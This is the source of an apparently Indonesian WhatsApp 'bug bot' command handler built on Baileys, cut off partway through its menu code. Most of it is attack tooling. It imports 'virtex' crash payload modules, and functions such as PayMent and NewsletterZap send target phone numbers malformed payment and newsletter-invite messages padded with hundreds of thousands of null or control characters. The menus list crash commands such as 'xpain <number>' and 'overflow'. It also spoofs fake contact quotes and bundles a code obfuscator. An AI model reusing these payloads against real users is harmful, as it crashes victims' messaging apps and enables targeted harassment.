
module.exports = async (zyn, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await zyn.decodeJid(zyn.user.id)
const sender = m.key.fromMe ? (zyn.user.id.split(':')[0]+'@s.whatsapp.net' || zyn.user.id) : (m.key.participant || m.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await zyn.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./pain.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./database/dtbs/deposit");
const { mediafireDl } = require('./database/dtbs/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const xbug = fs.readFileSync(`./database/image/xbug.jpg`)
const Xynz = fs.readFileSync(`./database/image/Xynz.jpg`) 
const zkosong = fs.readFileSync(`./database/image/zkosong.png`)

const bugres = 'WAIT KILLING COMRAD'

// VIRTEX
		const {
			ios
		} = require("./database/virtex/ios.js")
		const {
			telapreta3
		} = require("./database/virtex/telapreta3.js")
		const {
			convite
		} = require("./database/virtex/convite.js")
		const {
			bugpdf
		} = require("./database/virtex/bugpdf.js")
		const {
			cP
		} = require('./database/virtex/bugUrl.js')
	
	
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return zyn.updateBlockStatus(m.sender, 'block')
if (m.sender.startsWith('229')) return zyn.updateBlockStatus(m.sender, 'block')
// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold('Ada Pesan, Om'), color(`[ PUTRA NEW ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = '_Bonjour Maitre_'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Bonjour Maitre.'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Bonsoir Maitre.'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Bonsoir Maitre.🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
       
    zyn.autoshalat = zyn.autoshalat ? zyn.autoshalat : {}
    let id = m.chat
    if (id in zyn.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        zyn.autoshalat[id] = [
            zyn.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

// Read Database
const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   zyn.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: zyn.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `By Putra Crash`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await zyn.sendPresenceUpdate('composing', jid)
      return zyn.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
		    
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await zyn.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await zyn.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
		
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
		
		async function PayMent(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								"hasMediaAttachment": true,
								'sequenceNumber': '0',
								"jpegThumbnail": ""
							},
							'nativeFlowMessage': {
								"buttons": [{
									"name": "review_and_pay",
									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${bugpdf},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			zyn.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}

		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "Zynxzo Script" + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": `Undangan Admin Channel Zynxzo Script`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await zyn.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

		const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁ 𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨-𝐵𝑈𝐺 𝐵𝛩𝑇 ╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const Porke2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰ 𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨-𝐵𝑈𝐺 𝐵𝛩𝑇 ╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await zyn.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await zyn.getName(i + '@s.whatsapp.net')}\n
FN:${await zyn.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: barasukimewing@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029VapVjjr1noz8wOgd6144
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function monospace(string) {
return '```' + string + '```'
}

   function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await zyn.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

// FUNCTION OBFUSCATOR 
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `putz`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
 
//Status
if (!zyn.public) {
if (!m.key.fromMe) return
} 

async function loading () {
var baralod = [
"𝐂𝚮𝚫𝚪",
"𝐂𝚮𝚫𝚪𝚰𝐒",
"𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨", 
"𝐵𝑈𝐺 ",
" 𝐵𝛩𝑇", 
]
let { key } = await zyn.sendMessage(from, {text: 'P'})

for (let i = 0; i < baralod.length; i++) {
await zyn.sendMessage(from, {text: baralod[i], edit: key });
}
}
        

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
zyn.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => {
            zyn.sendMessage(m.chat,
{
    text: teks,
    contextInfo: {
        mentionedJid: [sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `CRASHNULL`,
            "body": `${namabot}`,
            "previewType": "PHOTO",
            "thumbnailUrl": ``,
            "thumbnail": fs.readFileSync(`./database/image/Xynz.jpg`),
            "sourceUrl": `${isLink}`
        }
    }
},
{ quoted: m })
        }

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
zyn.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
zyn.groupParticipantsUpdate(m.chat, [sender], 'delete')
zyn.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

    
            case "pain-bugs": {

let menya = `   \`𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨-𝐵𝑈𝐺 𝐵𝛩𝑇\`
┏─── ✢｢ * 𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨* ｣✢ ──❐
┃🕸️ 𝐍𝐚𝐦𝐞 : *${global.namabot}*
┃🕸️ LIBRA : *BAILEYS - SOCKET*
┃🕸️ 𝐃𝐞𝐯 : *${global.namacreator}*
┃🕸️ 𝐕𝐞𝐫𝐬𝐢 : *${global.versisc}*
┃🕸️ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
 | ▃▃▃▃▃▃▃▃▃ ▃▃▃▃▃▃▃
┏─『𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨 𝐁𝐔𝐆』
│ ✘ xpain <number>
│ ✘ charis <number>
│ ✘ atomic <number> 
│ ✘ crashflow <number>
| ✘ attack <number>
| ✘ fuck <number>
| ✘ null999 <number>
| ✘ tzy <number>
| ✘ andro <number>
| ✘ xip <number>
| ✘ xios <number>
| ✘ charisma <number>
| ✘ vasion <number>
| ✘ xbug <number>
| ✘ overflow <number>
┗▭▬▭▬▭▬▭▬▭▬▭▬▭`;
                    zyn.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: false,
                                    title: global.namabot,
                                    body: global.namaCreator,
                                    thumbnailUrl:
                                    "https://files.catbox.moe/jzkpre.jpeg",
                                    sourceUrl: global.isLink,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: m
                        }
                    );
                }
break

case "taka-menu": {

let menya = `   \`𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨-𝐵𝑈𝐺 𝐵𝛩𝑇\`
┏─── ✢｢ * 𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨* ｣✢ ──❐
┃🕸️ 𝐍𝐚𝐦𝐞 : *${global.namabot}*
┃🕸️ LIBRA : *BAILEYS - SOCKET*
┃🕸️ 𝐃𝐞𝐯 : *${global.namacreator}*
┃🕸️ 𝐕𝐞𝐫𝐬𝐢 : *${global.versisc}*
┃🕸️ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
┗─ ▃▃▃▃▃▃▃▃▃ ____─❐
▭▬▭▬▭▬▭▬▭▬▭▬▭
─『𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨 𝐌𝐄𝐍𝐔』
│ ✘ ᴀᴅᴅᴏᴡɴᴇʀ
│ ✘ ᴀᴅᴅᴘʀᴇᴍ
│ ✘ ᴅᴇʟᴏᴡɴᴇʀ
│ ✘ ᴅᴇʟᴘʀᴇᴍ
│ ✘ ᴘᴜʙʟɪᴄ
│ ✘ sᴇʟғ
┗▭▬▭▬▭▬▭▬▭▬▭▬▭`;
                    zyn.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: false,
                                    title: global.namabot,
                                    body: global.namaCreator,
                                    thumbnailUrl:
                                    "https://files.catbox.moe/jzkpre.jpeg",
                                    sourceUrl: global.isLink,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: m
                        }
                    );
                }
break

case "tool-menu": {

let menya = `   \`𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨-𝐵𝑈𝐺 𝐵𝛩𝑇\`
┏─── ✢｢ * 𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨* ｣✢ ──❐
┃🕸️ 𝐍𝐚𝐦𝐞 : *${global.namabot}*
┃🕸️ LIBRA : *BAILEYS - SOCKET*
┃🕸️ 𝐃𝐞𝐯 : *${global.namacreator}*
┃🕸️ 𝐕𝐞𝐫𝐬𝐢 : *${global.versisc}*
┃🕸️ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
┗─ ▃▃▃▃▃▃▃▃▃ ______─❐
┏─『𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔』
│ ✘ ᴇɴᴄ <ᴄᴏᴅᴇ>
│ ✘ ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>
│ ✘ ᴀɪ <ᴛᴇᴋs>
┗▭▬▭▬▭▬▭▬▭▬▭▬▭`;
                    zyn.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: false,
                                    title: global.namabot,
                                    body: global.namaCreator,
                                    thumbnailUrl:
                                    "https://files.catbox.moe/jzkpre.jpeg",
                                    sourceUrl: global.isLink,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: m
                        }
                    );
                }
break

case "group-menu": {

let menya = `   \`𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨-𝐵𝑈𝐺 𝐵𝛩𝑇\`
┏─── ✢｢ * 𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨* ｣✢ ──❐
┃🕸️ 𝐍𝐚𝐦𝐞 : *${global.namabot}*
┃🕸️ LIBRA : *BAILEYS - SOCKET*
┃🕸️ 𝐃𝐞𝐯 : *${global.namacreator}*
┃🕸️ 𝐕𝐞𝐫𝐬𝐢 : *${global.versisc}*
┃🕸️ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
┗── ▃▃▃▃▃▃▃▃▃ ___──❐
┏─『𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔』
│ ✘ ʜɪᴅᴇᴛᴀɢ <ǫᴜᴇʀʏ>
│ ✘ ᴛᴀɢᴀʟʟ <ǫᴜᴇʀʏ>
│ ✘ ᴋɪᴄᴋ <ᴛᴀɢ>
│ ✘ ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>
│ ✘ ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>
┗▭▬▭▬▭▬▭▬▭▬▭▬▭`;
                    zyn.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: false,
                                    title: global.namabot,
                                    body: global.namaCreator,
                                    thumbnailUrl:
                                    "https://files.catbox.moe/jzkpre.jpeg",
                                    sourceUrl: global.isLink,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: m
                        }
                    );
                }
break

case "menu": {

let menya = `   \`𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨-𝐵𝑈𝐺 𝐵𝛩𝑇\`
┏─── ✢｢ * 𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨* ｣✢ ──❐
┃🕸️ 𝐍𝐚𝐦𝐞 : *${global.namabot}*
┃🕸️ LIBRA : *BAILEYS - SOCKET*
┃🕸️ 𝐃𝐞𝐯 : *${global.namacreator}*
┃🕸️ 𝐕𝐞𝐫𝐬𝐢 : *${global.versisc}*
┃🕸️ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
┗── ▃▃▃▃▃▃▃▃▃ ___──❐
┏─『𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨』
│ ✘ *allmenu*
│ ✘ *chari-menu*
│ ✘ *charis-bugs*
| ✘ *group-menu*
| ✘ *tool-menu*
┗▭▬▭▬▭▬▭▬▭▬▭▬▭`;
                    zyn.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: false,
                                    title: global.namabot,
                                    body: global.namaCreator,
                                    thumbnailUrl:
                                    "https://files.catbox.moe/jzkpre.jpeg",
                                    sourceUrl: global.isLink,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        },
                        {
                            quoted: m
                        }
                    );
                }
break

case "allmenu": {


let menya = `   \`𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨-𝐵𝑈𝐺 𝐵𝛩𝑇\`
┏─── ✢｢ * 𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨* ｣✢ ──❐
┃🕸️ 𝐍𝐚𝐦𝐞 : *${global.namabot}*
┃🕸️ LIBRA : *BAILEYS - SOCKET*
┃🕸️ 𝐃𝐞𝐯 : *${global.namacreator}*
┃🕸️ 𝐕𝐞𝐫𝐬𝐢 : *${global.versisc}*
┃🕸️ 𝐑𝐮𝐧 : *${runtime(process.uptime())}*
┗── ▃▃▃▃▃▃▃▃▃ ___──❐
┏─『𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨-𝐵𝑈𝐺 』
│ ✘ xpain <number>
│ ✘ charis <number>
│ ✘ atomic <number> 
│ ✘ crashflow <number>
| ✘ attack <number>
| ✘ fuck <number>
| ✘ null999 <number>
| ✘ tzy <number>
| ✘ andro <number>
| ✘ xip <number>
| ✘ xios <number>
| ✘ charisma <number>
| ✘ vasion <number>
| ✘ xbug <number>
| ✘ overflow <number>
▭▬▭▬▭▬▭▬▭▬▭▬▭
─『𝐂𝚮𝚫𝚪𝚰𝐒𝚳𝑨 𝐌𝐄𝐍𝐔』
│ ✘ ᴀᴅᴅᴏᴡɴᴇʀ
│ ✘ ᴀᴅᴅᴘʀᴇᴍ
│ ✘ ᴅᴇʟᴏᴡɴᴇʀ
│ ✘ ᴅᴇʟᴘʀᴇᴍ
│ ✘ ᴘᴜʙʟɪᴄ
│ ✘ sᴇʟғ
┗▭▬▭▬▭▬▭▬▭▬▭▬▭

┏─『𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔』
│ ✘ ᴇɴᴄ <ᴄᴏᴅᴇ>
│ ✘ ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>
│ ✘ ᴀɪ <ᴛᴇᴋs>
┗▭▬▭▬▭▬▭▬▭▬▭▬▭

┏─『𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔』
│ ✘ ʜɪᴅᴇᴛᴀɢ <ǫᴜᴇʀʏ>
│ ✘ ᴛᴀɢᴀʟʟ <ǫᴜᴇʀʏ>
│ ✘ ᴋɪᴄᴋ <ᴛᴀɢ>
│ ✘ ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>
│ ✘ ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>
┗▭▬▭▬▭▬▭▬▭▬▭▬▭`;
                    zyn.sendMessage(
                        m.chat,
                        {
                            text: menya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: false,
                                    title: global.namabot,
